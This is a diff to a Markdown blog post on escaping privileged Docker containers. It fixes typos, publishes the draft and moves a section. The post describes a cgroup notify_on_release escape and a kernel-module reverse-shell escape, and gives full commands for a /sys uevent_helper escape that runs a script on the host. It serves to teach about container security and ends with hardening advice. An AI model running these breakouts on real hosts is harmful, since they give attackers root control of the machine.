@@ -1,12 +1,13 @@
 ---
 title: "Container Breakouts – Part 2: Privileged Container"
-date: 2020-07-15T09:42:19+02:00
-draft: true
+date: 2020-07-21T15:42:19+02:00
+draft: false
 tags:
 - docker
 - breakout
 - security
 ---
+
 
 This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.
 
@@ -27,7 +28,7 @@ The following posts are part of the series:
 
 ## Intro
 
-This is the second post of my container breakout series. After the discussion how to escape from a system with access to only the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.
+This is the second post of my container breakout series. After the discussion how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.
 
 ## Privileged Container
 
@@ -71,7 +72,7 @@ A detailed summary about sensitive kernel capabilities can taken from the forum 
 
 #### `CAP_SYS_ADMIN` – cgroup notify on release escape
 
-One of the of the dangerous kernel capabilities is `CAP_SYS_ADMIN`. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – [cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html) are used to manage the system resources for container (that’s very brief – I know). 
+One of the dangerous kernel capabilities is `CAP_SYS_ADMIN`. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – [cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html) are used to manage the system resources for container (that’s very brief – I know). 
 
 In this escape, we use a **feature of cgroups** that allows the **execution** of code **in** the **root context**, after the last process in a cgroup is terminated. The feature is called **“notification on release”** and can only be set, because we have the capability `CAP_SYS_ADMIN`. 
 
@@ -114,13 +115,13 @@ To by honest, this **technique** was in my setup **a bit flaky** and I had some 
 
 #### `CAP_SYS_Module` – Load Kernel Module 
 
-What do you need do **load a kernel module on a unix host**? Exact, the right capability: `CAP_SYS_MODULE`. In advanced, you **must** be in the **same process namespace as** the **init** process, but **that is default** in case of plain Docker setups. You think now _how dare you_ this is something nobody would do!? That is exactly what happened to _Play-with-Docker_. I recommend reading the post [How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) by Nimrod Stoler ([@n1mr0d5](https://twitter.com/n1mr0d5)) to get all insights and the fully picture.
+What do you need to **load a kernel module on a unix host**? Exact, the right capability: `CAP_SYS_MODULE`. In advance, you **must** be in the **same process namespace as** the **init** process, but **that is default** in case of plain Docker setups. You think now _how dare you_ this is something nobody would do!? That is exactly what happened to _Play-with-Docker_. I recommend reading the post [How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) by Nimrod Stoler ([@n1mr0d5](https://twitter.com/n1mr0d5)) to get all insights and the full picture.
 
-The exploitation cannot be that easily weaponized, because we need a **kernel module** that **fits** to the **kernel version**. To do so, we need to **compile** our own **kernel module** for the host system kerne. I thought initially that’s an easy one, just _copy&paste_ the code, compile and finished. Sounds easy? Actually it is not that easy if you have an ubuntu container on an Archlinux host – sigh.
+The exploitation cannot be that easily weaponized, because we need a **kernel module** that **fits** the **kernel version**. To do so, we need to **compile** our own **kernel module** for the host system kerne. I thought initially that’s an easy one, just _copy&paste_ the code, compile and finished. Sounds easy? Actually, it is not that easy if you have an ubuntu container on an Archlinux host – sigh.
 
 To perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will **pre-compile** the **kernel module outside** of the **container**. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the ubuntu tool chain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.
 
-To **prepare** the **kernel module**, you **need** the **kernel headers** for the host that runs the container. You can find them while googleing through the internet and search for the kernel version headers (kernel version can be identified by `uname -r`). Afterwards, you need the _gcc_ compiler and _make_ and that’s it.
+To **prepare** the **kernel module**, you **need** the **kernel headers** for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by `uname -r`). Afterward, you need the _gcc_ compiler and _make_ and that’s it.
 
 The following steps has been performed on a separate host (an ubuntu system).
 
@@ -157,7 +158,7 @@ make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 
 ```
 
-After the **kernel module** is **prepared**, the binary is **transferred to** the privileged **container**. This can be Base64-encodeed (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the **listener** for the **reverse shell**. 
+After the **kernel module** is **prepared**, the binary is **transferred to** the privileged **container**. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the **listener** for the **reverse shell**. 
 
 **Terminal 1**
 
@@ -166,7 +167,7 @@ After the **kernel module** is **prepared**, the binary is **transferred to** th
 listening on [any] 1337 ...
 ```
 
-Terminal 1 must be on a system that is accessible from the host, that servs the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.
+Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.
 
 **Terminal 2** 
 ```
@@ -189,6 +190,47 @@ root@linux-box:/#
 
 A more detailed explanation can be found here [Docker Container Breakout: Abusing SYS_MODULE capability!](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) by [Nishant Sharma](https://linkedin.com/in/wifisecguy/).
 
+
+### Linux kernel Filesystem `/sys`
+
+The Linux kernel offers access over the filesystem `/sys` direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the `uevent_helper` which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the `/sys` filesystem.
+
+An example to execute commands on the host system is as follows:
+
+1. Create “callback”
+2. Link “callback”
+3. Trigger “callback”
+
+```
+# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+# cat << EOF > /trigger.sh
+#!/bin/sh  
+ps auxf > $host_path/output.txt
+EOF
+
+# chmod +x /trigger.sh 
+
+# echo $host_path/trigger.sh > /sys/kernel/uevent_helper
+
+# echo change > /sys/class/mem/null/uevent
+
+# head /output.txt
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         2  0.0  0.0      0     0 ?        S    14:14   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/0:0]
+root         4  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [kworker/0:0H]
+root         5  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/u4:0]
+root         6  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [mm_percpu_wq]
+root         7  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [migration/0]
+``` 
+
+As you can see, the script is executed and the output made available inside the container. 
+
+_Remark: Thanks to Matthias ([@uchi_mata](https://twitter.com/uchi_mata)) for the review and remembering me to add this breakout  technique!_
 
 ### Host Devices
 
@@ -223,48 +265,13 @@ drwxr-xr-x  10 root root  4096 May 26 14:37 usr
 
 Escalating the access to the root directory of the host is already described in the **previous part** of the series [Part 1: Access to root directory of the Host](../container-breakouts-part1).
 
-### Linux kernel Filesystem `/sys`
-
-The Linux kernel offers access over the filesystem `/sys` direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the `uevent_helper` which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the `/sys` filesystem.
-
-An example to execute commands on the host system is as following:
-
-```
-# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-
-# cat << EOF > /trigger.sh
-#!/bin/sh  
-ps auxf > $host_path/output.txt
-EOF
-
-# chmod +x /trigger.sh 
-
-# echo $host_path/trigger.sh > /sys/kernel/uevent_helper
-
-# echo change > /sys/class/mem/null/uevent
-
-# head /output.txt
-USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root         2  0.0  0.0      0     0 ?        S    14:14   0:00 [kthreadd]
-root         3  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/0:0]
-root         4  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [kworker/0:0H]
-root         5  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [kworker/u4:0]
-root         6  0.0  0.0      0     0 ?        I<   14:14   0:00  \_ [mm_percpu_wq]
-root         7  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [ksoftirqd/0]
-root         8  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_sched]
-root         9  0.0  0.0      0     0 ?        I    14:14   0:00  \_ [rcu_bh]
-root        10  0.0  0.0      0     0 ?        S    14:14   0:00  \_ [migration/0]
-``` 
-
-As you can see, the script is executed and the output made available inside the container. 
-
 ## Conclusion
 
 We have seen three approaches that can be used if a Unix container is started with insecure configuration. 
 
-The main take away message is that one should be careful if a container must be started in privileged mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda.
+The main take away message is that one should **be careful if** a **container must** be **started** in **privileged** mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. **Never start a container privileged if it is not necessary** and review carefully the additional capabilities that a container might require.
 
-Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices ;)
+Now you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.
 
 If you are interested how to use the Docker socket to get out of the container, stay tuned for the next blog post of the series _**Part 3: Docker Socket**_.
 
